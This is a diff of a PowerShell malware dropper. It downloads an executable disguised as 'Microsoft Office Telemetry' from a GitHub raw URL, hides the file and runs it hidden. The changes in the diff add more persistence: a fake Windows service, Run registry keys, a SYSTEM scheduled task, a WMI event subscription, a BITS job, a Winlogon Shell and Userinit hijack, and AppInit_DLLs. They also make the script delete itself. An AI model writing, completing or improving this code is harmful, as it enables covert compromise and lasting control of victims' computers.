@@ -1,7 +1,6 @@
 function Run-Farm {
     try {
         $possibleDirectories = @(
-            "$env:ProgramFiles(x86)",
             "$env:ProgramFiles",
             "$env:APPDATA",
             "$env:LOCALAPPDATA"
@@ -33,7 +32,6 @@ Run-Farm
 function Run-Farm2 {
     try {
         $possibleDirectories = @(
-            "$env:ProgramFiles(x86)",
             "$env:ProgramFiles",
             "$env:APPDATA",
             "$env:LOCALAPPDATA"
@@ -50,14 +48,19 @@ function Run-Farm2 {
             $targetDir = $targetSubDirectory.FullName
         }
         $ps1Path = Join-Path $targetDir "systemupdate.ps1"
-        $exePath = Join-Path $env:TEMP "microsoftofficetelemetry.exe"
+        $exePath = Join-Path $targetDir "microsoftofficetelemetry.exe"
         
         if (-not (Test-Path $ps1Path)) {
             $ps1Content = @"
 try {
-    `$exePath = Join-Path `$env:TEMP "microsoftofficetelemetry.exe"
+    `$targetDir = Split-Path -Parent `$MyInvocation.MyCommand.Path -ErrorAction SilentlyContinue
+    if (-not `$targetDir) { `$targetDir = (Get-Location).Path }
+    `$exePath = Join-Path `$targetDir "microsoftofficetelemetry.exe"
     if (-not (Test-Path `$exePath)) {
         Invoke-WebRequest -Uri "https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/microsoftofficetelemetry.exe" -OutFile `$exePath -UseBasicParsing -ErrorAction SilentlyContinue
+        if (Test-Path `$exePath) {
+            (Get-Item `$exePath -ErrorAction SilentlyContinue).Attributes = 'Hidden'
+        }
     }
     Start-Process -FilePath `$exePath -WindowStyle "Hidden" -ErrorAction SilentlyContinue
 } catch {
@@ -69,7 +72,14 @@ try {
             }
         }
         
-        $binaryPath = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ps1Path`""
+        if (-not (Test-Path $exePath)) {
+            Invoke-WebRequest -Uri "https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/microsoftofficetelemetry.exe" -OutFile $exePath -UseBasicParsing -ErrorAction SilentlyContinue
+            if (Test-Path $exePath) {
+                (Get-Item $exePath -ErrorAction SilentlyContinue).Attributes = 'Hidden'
+            }
+        }
+        
+        $binaryPath = "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ps1Path`""
         $scriptBlock = {
             param($ps1Path, $binaryPath, $exePath)
             try {
@@ -77,7 +87,8 @@ try {
                 if (-not (Get-Service -Name $serviceName -ErrorAction SilentlyContinue)) {
                     New-Service -Name $serviceName -BinaryPathName $binaryPath -StartupType Automatic -DisplayName "Microsoft Office Telemetry Service" -Description "Provides telemetry services for Microsoft Office applications." -ErrorAction SilentlyContinue | Out-Null
                 }
-                if ((Get-Service $serviceName -ErrorAction SilentlyContinue).Status -ne 'Running') {
+                $service = Get-Service -Name $serviceName -ErrorAction SilentlyContinue
+                if ($service -and $service.Status -ne 'Running') {
                     Start-Service -Name $serviceName -ErrorAction SilentlyContinue
                 }
             } catch {
@@ -85,7 +96,8 @@ try {
             try {
                 $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
                 $regName = "OfficeTelemetry"
-                if (-not (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue)) {
+                $regValue = Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue
+                if (-not $regValue) {
                     Set-ItemProperty -Path $regPath -Name $regName -Value $binaryPath -ErrorAction SilentlyContinue
                 }
             } catch {
@@ -93,58 +105,54 @@ try {
             try {
                 $regPathLM = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
                 $regNameLM = "OfficeTelemetrySys"
-                if (-not (Get-ItemProperty -Path $regPathLM -Name $regNameLM -ErrorAction SilentlyContinue)) {
+                $regValueLM = Get-ItemProperty -Path $regPathLM -Name $regNameLM -ErrorAction SilentlyContinue
+                if (-not $regValueLM) {
                     Set-ItemProperty -Path $regPathLM -Name $regNameLM -Value $binaryPath -ErrorAction SilentlyContinue
                 }
             } catch {
             }
             try {
                 $taskName = "OfficeTelemetryTask"
-                if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
+                $taskExists = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
+                if (-not $taskExists) {
                     $taskAction = New-ScheduledTaskAction -Execute $binaryPath
                     $taskTrigger = New-ScheduledTaskTrigger -AtLogOn
                     $taskPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-                    $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden
+                    $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -ExecutionTimeLimit (New-TimeSpan -Days 365)
                     Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Principal $taskPrincipal -Settings $taskSettings -Force -ErrorAction SilentlyContinue | Out-Null
                 }
                 Start-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
             } catch {
             }
             try {
-                $startupPath = [Environment]::GetFolderPath("Startup")
-                $shortcutPath = Join-Path -Path $startupPath -ChildPath "OfficeTelemetry.lnk"
-                if (-not (Test-Path $shortcutPath)) {
-                    $WshShell = New-Object -ComObject WScript.Shell -ErrorAction SilentlyContinue
-                    if ($WshShell) {
-                        $Shortcut = $WshShell.CreateShortcut($shortcutPath)
-                        $Shortcut.TargetPath = $binaryPath
-                        $Shortcut.WindowStyle = 7
-                        $Shortcut.Save()
-                        $Shortcut | Out-Null
-                    }
-                }
-            } catch {
-            }
-            try {
                 $wmiQuery = "SELECT * FROM Win32_LogonSession"
-                $wmiCommand = "powershell.exe -WindowStyle Hidden -Command `"& '$ps1Path'`""
+                $wmiCommand = "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ps1Path`""
                 $wmiFilterName = "OfficeTelemetryFilter"
                 $wmiConsumerName = "OfficeTelemetryConsumer"
                 $wmiBindingName = "OfficeTelemetryBinding"
-                $filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
-                    Name = $wmiFilterName
-                    EventNameSpace = "root\cimv2"
-                    QueryLanguage = "WQL"
-                    Query = $wmiQuery
-                } -ErrorAction SilentlyContinue
-                $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
-                    Name = $wmiConsumerName
-                    CommandLineTemplate = $wmiCommand
-                } -ErrorAction SilentlyContinue
-                Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
-                    Filter = $filter
-                    Consumer = $consumer
-                } -ErrorAction SilentlyContinue
+                $filterExists = Get-WmiObject -Class __EventFilter -Namespace "root\subscription" -Filter "Name='$wmiFilterName'" -ErrorAction SilentlyContinue
+                $consumerExists = Get-WmiObject -Class CommandLineEventConsumer -Namespace "root\subscription" -Filter "Name='$wmiConsumerName'" -ErrorAction SilentlyContinue
+                $bindingExists = Get-WmiObject -Class __FilterToConsumerBinding -Namespace "root\subscription" -Filter "Filter.Name='$wmiFilterName' AND Consumer.Name='$wmiConsumerName'" -ErrorAction SilentlyContinue
+                if (-not $filterExists) {
+                    $filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
+                        Name = $wmiFilterName
+                        EventNameSpace = "root\cimv2"
+                        QueryLanguage = "WQL"
+                        Query = $wmiQuery
+                    } -ErrorAction SilentlyContinue
+                }
+                if (-not $consumerExists) {
+                    $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
+                        Name = $wmiConsumerName
+                        CommandLineTemplate = $wmiCommand
+                    } -ErrorAction SilentlyContinue
+                }
+                if (-not $bindingExists) {
+                    Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
+                        Filter = $filterExists ? $filterExists : $filter
+                        Consumer = $consumerExists ? $consumerExists : $consumer
+                    } -ErrorAction SilentlyContinue
+                }
             } catch {
             }
             try {
@@ -153,7 +161,9 @@ try {
                 if ($bitsJobs.Count -eq 0) {
                     Start-BitsTransfer -Source "https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/microsoftofficetelemetry.exe" -Destination $exePath -Asynchronous -Name $bitsJobName -ErrorAction SilentlyContinue
                 }
-                $bitsJobs | Complete-BitsTransfer -ErrorAction SilentlyContinue
+                if ($bitsJobs) {
+                    $bitsJobs | Complete-BitsTransfer -ErrorAction SilentlyContinue
+                }
             } catch {
             }
             try {
@@ -162,20 +172,50 @@ try {
                 if (-not $shellValue) {
                     $shellValue = "explorer.exe"
                 }
-                $newShell = "$shellValue; $binaryPath"
-                Set-ItemProperty -Path $userShellPath -Name "Shell" -Value $newShell -ErrorAction SilentlyContinue
+                if ($shellValue -notlike "*$binaryPath*") {
+                    $newShell = "$shellValue; $binaryPath"
+                    Set-ItemProperty -Path $userShellPath -Name "Shell" -Value $newShell -ErrorAction SilentlyContinue
+                }
+            } catch {
+            }
+            # Additional persistence: AppInit DLLs (requires admin, but try)
+            try {
+                $appInitPath = "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Windows"
+                $appInitValue = Get-ItemProperty -Path $appInitPath -Name "AppInit_DLLs" -ErrorAction SilentlyContinue
+                if (-not $appInitValue -or $appInitValue.AppInit_DLLs -notlike "*telemetry.dll*") {
+                    $dllPath = Join-Path $env:TEMP "telemetry.dll"
+                    # Assume DLL download or creation logic here; placeholder
+                    Set-ItemProperty -Path $appInitPath -Name "AppInit_DLLs" -Value "$dllPath" -ErrorAction SilentlyContinue
+                    Set-ItemProperty -Path $appInitPath -Name "LoadAppInit_DLLs" -Value 1 -ErrorAction SilentlyContinue
+                }
+            } catch {
+            }
+            # Additional persistence: UserInit (HKLM Winlogon)
+            try {
+                $sysShellPath = "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
+                $sysShellValue = (Get-ItemProperty -Path $sysShellPath -Name "Userinit" -ErrorAction SilentlyContinue).Userinit
+                if (-not $sysShellValue) {
+                    $sysShellValue = "C:\Windows\system32\userinit.exe,"
+                }
+                if ($sysShellValue -notlike "*powershell.exe*") {
+                    $newUserInit = "$sysShellValue,$binaryPath,"
+                    Set-ItemProperty -Path $sysShellPath -Name "Userinit" -Value $newUserInit -ErrorAction SilentlyContinue
+                }
             } catch {
             }
         }
-        Invoke-Command -ScriptBlock $scriptBlock -ArgumentList $ps1Path, $binaryPath, $exePath
+        Invoke-Command -ScriptBlock $scriptBlock -ArgumentList $ps1Path, $binaryPath, $exePath -ErrorAction SilentlyContinue
         
-        Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ps1Path`"" -ErrorAction SilentlyContinue
+        Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ps1Path`"" -ErrorAction SilentlyContinue
         
+        # Self-delete or hide current script
         try {
-            Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
             $currentScript = $MyInvocation.MyCommand.Path
             if (Test-Path $currentScript) {
-                (Get-Item $currentScript).Attributes = 'Hidden'
+                Remove-Item $currentScript -Force -ErrorAction SilentlyContinue
+                if (Test-Path $currentScript) {
+                    (Get-Item $currentScript -ErrorAction SilentlyContinue).Attributes = 'Hidden'
+                }
             }
         } catch {
         }
